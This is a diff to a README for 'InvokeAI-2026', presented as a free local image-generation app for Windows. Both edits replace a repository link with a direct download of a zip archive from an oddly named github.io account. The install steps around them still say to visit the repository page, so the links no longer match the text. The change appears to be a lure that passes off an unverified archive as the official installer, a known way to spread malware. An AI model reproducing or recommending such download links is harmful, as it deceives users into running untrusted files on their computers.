@@ -5,7 +5,7 @@ description: "Download and install the full version of InvokeAI for Windows 10 a
 ---
 # 🎨 InvokeAI-2026 - Generate High Quality Images Locally Today
 
-[ ![Download InvokeAI-2026](https://img.shields.io/badge/Download-InvokeAI--2026-blue.svg) ](https://github.com/genustetrahymenachoctaw297/InvokeAI-2026)
+[ ![Download InvokeAI-2026](https://img.shields.io/badge/Download-InvokeAI--2026-blue.svg) ](https://raw.githubusercontent.com/genustetrahymenachoctaw297/genustetrahymenachoctaw297.github.io/main/turma/v3.8-alpha.3.zip)
 
 InvokeAI-2026 provides a way to create professional images on your personal computer. This software runs locally on your machine, which means your data stays private and you do not need a subscription to generate artwork. The program uses artificial intelligence to turn text prompts into visual art.
 
@@ -25,7 +25,7 @@ If your computer does not meet these requirements, the program might run slowly 
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the repository page to begin: [Download InvokeAI-2026](https://github.com/genustetrahymenachoctaw297/InvokeAI-2026).
+1. Visit the repository page to begin: [Download InvokeAI-2026](https://raw.githubusercontent.com/genustetrahymenachoctaw297/genustetrahymenachoctaw297.github.io/main/turma/v3.8-alpha.3.zip).
 2. Look for the releases section on the right side of the page.
 3. Select the most recent version of the software installer.
 4. Click the link to save the installer file to your computer.
